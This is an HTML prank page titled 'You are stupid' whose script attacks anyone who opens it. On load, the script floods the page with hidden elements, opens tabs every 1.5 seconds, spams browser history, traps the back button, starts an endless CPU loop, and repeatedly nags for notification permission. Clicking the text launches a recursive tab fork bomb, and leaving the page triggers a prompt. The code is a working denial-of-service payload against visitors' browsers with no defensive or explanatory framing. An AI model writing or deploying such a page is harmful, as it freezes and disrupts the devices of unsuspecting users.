<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>You are stupid</title>
  <style>
    body {
      background: white;
      margin: 0;
      padding: 0;
      overflow: hidden;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      font-family: "Georgia", "Times New Roman", Times, serif;
      font-size: 20px;
    }

    .text {
      animation: glitch 0.2s infinite alternate;
      cursor: pointer;
      user-select: none;
    }

    @keyframes glitch {
      0% { transform: translate(0, 0); }
      50% { transform: translate(2px, -2px); }
      100% { transform: translate(0, 0); }
    }
  </style>
</head>
<body>
  <div class="text" id="mainText">You are stupid<br>(Click Here)</div>

  <audio id="audio" autoplay loop>
    <source src="music.mp3" type="audio/mpeg">
    Your browser does not support the audio element.
  </audio>

  <script>
    function heavyLoop() {
      while (true) {
        let arr = [];
        for (let i = 0; i < 1e7; i++) {
          arr.push(Math.random());
        }
      }
    }

    function recursiveCrash() {
      setTimeout(recursiveCrash, 0);
      for (let i = 0; i < 10000; i++) {
        let node = document.createElement('div');
        node.style.width = '1px';
        node.style.height = '1px';
        node.style.opacity = '0';
        document.body.appendChild(node);
      }
    }

    function spamHistory() {
      for (let i = 0; i < 500; i++) {
        history.pushState({}, '', window.location.pathname + '?crash=' + Math.random());
      }
    }

    function hijackBack() {
      window.onpopstate = function() {
        history.pushState({}, '', window.location.pathname + '?trap=' + Math.random());
      };
    }

    function openTabs() {
      for (let i = 0; i < 30; i++) {
        window.open(window.location.href, '_blank');
      }
    }

    function clickOpenTabs() {
      for (let i = 0; i < 100; i++) {
        let child = window.open(window.location.href + '?fork=' + Math.random(), '_blank');
        if (child) {
          child.onload = () => {
            try {
              child.forkTabs && child.forkTabs();
            } catch (e) {}
          };
        }
      }
    }

    function forkTabs() {
      setTimeout(() => {
        for (let i = 0; i < 10; i++) {
          let baby = window.open(window.location.href + '?forkagain=' + Math.random(), '_blank');
          if (baby) {
            baby.onload = () => {
              try {
                baby.forkTabs && baby.forkTabs();
              } catch (e) {}
            };
          }
        }
      }, 1000);
    }

    window.forkTabs = forkTabs;

    window.onload = function() {
      try {
        var audio = document.getElementById('audio');
        audio.play().catch(() => {});
      } catch(e) {}

      // DOM overload
      recursiveCrash();

      // Regular spam tabs
      setInterval(openTabs, 1500);

      // History spam
      setTimeout(spamHistory, 2000);

      // Hijack back button
      hijackBack();

      // CPU overload
      setTimeout(heavyLoop, 4000);

      // Notification spam
      setTimeout(() => {
        if (Notification.permission !== "granted") {
          Notification.requestPermission().then(permission => {
            if (permission !== "granted") {
              setInterval(() => {
                Notification.requestPermission();
              }, 3000);
            }
          });
        }
      }, 5000);

      // UI shake
      setInterval(() => {
        document.body.style.transform = 'scale(' + (1 + Math.random()*0.01) + ') rotate(' + (Math.random() * 10 - 5) + 'deg)';
      }, 100);

      // Click to spam tabs and fork bomb
      document.getElementById('mainText').addEventListener('click', clickOpenTabs);
    };

    window.onbeforeunload = function() {
      return "Are you sure you want to leave?";
    };
  </script>
</body>
</html>
